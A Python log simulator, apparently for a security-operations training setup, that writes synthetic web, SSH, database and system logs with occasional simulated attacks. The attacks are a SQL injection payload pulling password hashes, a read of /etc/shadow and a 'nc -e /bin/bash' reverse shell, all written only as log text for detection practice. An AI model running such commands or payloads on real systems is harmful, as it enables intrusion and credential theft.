"""
victim_app.py - Authentic Victim Application Log Simulator
----------------------------------------------------------------------------
Simulates a real-world enterprise web application, database, and auth stack.
Generates natural, realistic production log traffic at a human-like cadence
without spamming. Security events are rare and natural.
----------------------------------------------------------------------------
"""

import os
import sys
import time
import random
import argparse
from datetime import datetime
from pathlib import Path

# ---------------------------------------------------------------------------
# Entities & Context Pools
# ---------------------------------------------------------------------------

LEGIT_IPS = [
    "192.168.1.14", "192.168.1.28", "192.168.1.45",
    "10.0.4.12", "10.0.4.88", "172.16.2.19",
]

THREAT_IPS = [
    "185.220.101.34", "45.33.32.156", "198.51.100.23", "91.134.213.56"
]

EMPLOYEES = ["alice.miller", "bob.jenkins", "charlie.davis", "dave.wilson", "sarah.connor"]
ATTACK_TARGET_USERS = ["admin", "root", "administrator", "guest", "test_user"]

ENDPOINTS = [
    ("/api/v1/dashboard/metrics", "GET", 200, (18, 95)),
    ("/api/v1/users/profile",     "GET", 200, (12, 45)),
    ("/api/v1/inventory/items",   "GET", 200, (35, 120)),
    ("/api/v1/reports/summary",   "GET", 200, (65, 210)),
    ("/static/css/theme.css",     "GET", 304, (4, 15)),
    ("/static/js/app-bundle.js",  "GET", 200, (25, 80)),
    ("/api/v1/auth/token/refresh","POST", 200, (40, 110)),
]

USER_AGENTS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/124.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:125.0) Gecko/20100101 Firefox/125.0",
]


def _ts():
    return datetime.now().strftime("%Y-%m-%d %H:%M:%S")


def _http_date():
    return datetime.now().strftime("%d/%b/%Y:%H:%M:%S +0000")


# ---------------------------------------------------------------------------
# Realistic Generators
# ---------------------------------------------------------------------------

def gen_web_browsing_session():
    """Simulate a natural user browsing session (page request + asset fetches)."""
    ip = random.choice(LEGIT_IPS)
    ua = random.choice(USER_AGENTS)
    lines = []
    
    endpoint, method, code, (min_ms, max_ms) = random.choice(ENDPOINTS)
    ms = random.randint(min_ms, max_ms)
    bytes_sent = random.randint(1200, 15400)
    lines.append(f'{_ts()} INFO  [nginx/1.24.0] {ip} - - [{_http_date()}] "{method} {endpoint} HTTP/1.1" {code} {bytes_sent} "https://app.internal/portal" "{ua}" {ms}ms')
    
    if random.random() < 0.5:
        lines.append(f'{_ts()} INFO  [nginx/1.24.0] {ip} - - [{_http_date()}] "GET /static/chunks/vendor.js HTTP/1.1" 200 48920 "https://app.internal/portal" "{ua}" 18ms')
        
    return "\n".join(lines)


def gen_auth_success():
    user = random.choice(EMPLOYEES)
    ip = random.choice(LEGIT_IPS)
    port = random.randint(49152, 65535)
    return f'{_ts()} INFO  [sshd[{random.randint(2100, 8900)}]] Accepted publickey for {user} from {ip} port {port} ssh2: ED25519 SHA256:7c9e0d1f'


def gen_database_query():
    tbl = random.choice(["users", "orders", "audit_log", "sessions", "tenants"])
    ms = random.uniform(1.2, 18.5)
    return f'{_ts()} INFO  [postgres] [LOG] duration: {ms:.3f} ms  statement: SELECT id, status, updated_at FROM {tbl} WHERE tenant_id = 42 ORDER BY id DESC LIMIT 25;'


def gen_system_telemetry():
    pid = random.randint(1000, 4500)
    task = random.choice([
        "logrotate.service: Succeeded.",
        "Daily apt upgrade and clean activities: Succeeded.",
        "fstrim.service: Discarded 4.8 GiB on /dev/sda1.",
        "systemd-resolved: Flushed all DNS caches.",
    ])
    return f'{_ts()} INFO  [systemd[{pid}]] {task}'


# ---------------------------------------------------------------------------
# Occasional Security Scenarios (Rare)
# ---------------------------------------------------------------------------

def gen_failed_auth_probe():
    user = random.choice(ATTACK_TARGET_USERS)
    ip = random.choice(THREAT_IPS)
    port = random.randint(40000, 60000)
    return f'{_ts()} WARNING [sshd[{random.randint(2100, 8900)}]] Failed password for invalid user {user} from {ip} port {port} ssh2'


def gen_sql_injection_attempt():
    ip = random.choice(THREAT_IPS)
    payload = "1' OR '1'='1' UNION SELECT null, username, password_hash FROM admin_users--"
    return (
        f'{_ts()} ERROR   [nginx/1.24.0] {ip} - - [{_http_date()}] "GET /api/v1/products?cat={payload} HTTP/1.1" 500 240 "-" "sqlmap/1.7.2#stable"\n'
        f'{_ts()} ERROR   [postgres] [ERROR] syntax error at or near "UNION": query execution aborted'
    )


def gen_privilege_escalation():
    user = random.choice(EMPLOYEES)
    ip = random.choice(THREAT_IPS)
    return (
        f'{_ts()} ERROR   [sudo] {user} : 3 incorrect password attempts ; TTY=pts/0 ; PWD=/home/{user} ; USER=root ; COMMAND=/bin/bash\n'
        f'{_ts()} CRITICAL [pam_unix] authentication failure; logname={user} uid=1001 euid=0 tty=pts/0 rhost={ip} user=root'
    )


def gen_unauthorized_file_read():
    ip = random.choice(THREAT_IPS)
    return f'{_ts()} CRITICAL [auditd] SYSCALL arch=c000003e syscall=2 success=no exit=-13 name=/etc/shadow comm=cat exe=/usr/bin/cat key=unauthorized_shadow_read'


def gen_suspicious_process():
    ip = random.choice(THREAT_IPS)
    return f'{_ts()} CRITICAL [process_monitor] Suspicious execution detected: `nc -e /bin/bash {ip} 4444` spawned by parent pid={random.randint(1200, 8900)}'


NORMAL_POOL = [
    (gen_web_browsing_session, 50),
    (gen_database_query,       30),
    (gen_auth_success,         12),
    (gen_system_telemetry,      8),
]

# Attacks are rare; critical execution/dumps are very rare
ATTACK_POOL = [
    (gen_failed_auth_probe,      60),
    (gen_sql_injection_attempt,  25),
    (gen_privilege_escalation,   10),
    (gen_unauthorized_file_read,  3),
    (gen_suspicious_process,      2),
]


def weighted_pick(pool):
    fns, weights = zip(*pool)
    return random.choices(fns, weights=weights, k=1)[0]


# ---------------------------------------------------------------------------
# Main Loop
# ---------------------------------------------------------------------------

def run(output_dir: str, min_delay: float, max_delay: float, attack_rate: float, verbose: bool = False):
    log_dir = Path(output_dir)
    log_dir.mkdir(parents=True, exist_ok=True)
    log_file = log_dir / "app.log"

    print(f"[Victim App] Logging actively to {str(log_file)} (Logs visible in Frontend GUI). Press Ctrl+C to stop.")

    event_count = 0
    attack_count = 0
    start_time = time.time()
    last_critical_time = time.time() - 120.0  # Initial critical arrives ~60s in, then every 3 min

    try:
        while True:
            now_ts = time.time()
            if (now_ts - last_critical_time >= 180.0) and (event_count > 5):
                gen_fn = random.choice([gen_privilege_escalation, gen_unauthorized_file_read, gen_suspicious_process])
                attack_count += 1
                tag = "CRIT "
                last_critical_time = now_ts
            elif (random.random() < attack_rate) and (event_count > 6):
                gen_fn = weighted_pick(ATTACK_POOL)
                attack_count += 1
                tag = "ALERT "
            else:
                gen_fn = weighted_pick(NORMAL_POOL)
                tag = "NORMAL"

            log_chunk = gen_fn()
            event_count += 1

            with open(log_file, "a", encoding="utf-8") as fh:
                fh.write(log_chunk + "\n")
                fh.flush()

            if verbose:
                elapsed = int(time.time() - start_time)
                first_line = log_chunk.splitlines()[0]
                if len(first_line) > 90:
                    first_line = first_line[:87] + "..."
                print(f"[{elapsed:>4}s] [{tag}] #{event_count:>4} | {first_line}", flush=True)

            delay = random.uniform(min_delay, max_delay)
            time.sleep(delay)

    except KeyboardInterrupt:
        elapsed = time.time() - start_time
        print(f"\n[Victim App] Stopped. Generated {event_count} events ({attack_count} alerts).")


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description="SOC-in-a-Box Realistic Victim Application Log Simulator")
    parser.add_argument("--output",      default="./victim_app/logs", help="Output directory for log files")
    parser.add_argument("--min-delay",   type=float, default=4.0,     help="Minimum delay between events in seconds (default: 4.0)")
    parser.add_argument("--max-delay",   type=float, default=8.5,     help="Maximum delay between events in seconds (default: 8.5)")
    parser.add_argument("--attack-rate", type=float, default=0.02,    help="Probability of security events (default: 0.02 = 2%)")
    parser.add_argument("--verbose",     action="store_true",         help="Print log lines to console (default: False)")
    args = parser.parse_args()

    run(
        output_dir  = args.output,
        min_delay   = max(1.0, args.min_delay),
        max_delay   = max(args.min_delay + 0.5, args.max_delay),
        attack_rate = max(0.0, min(1.0, args.attack_rate)),
        verbose     = args.verbose,
    )
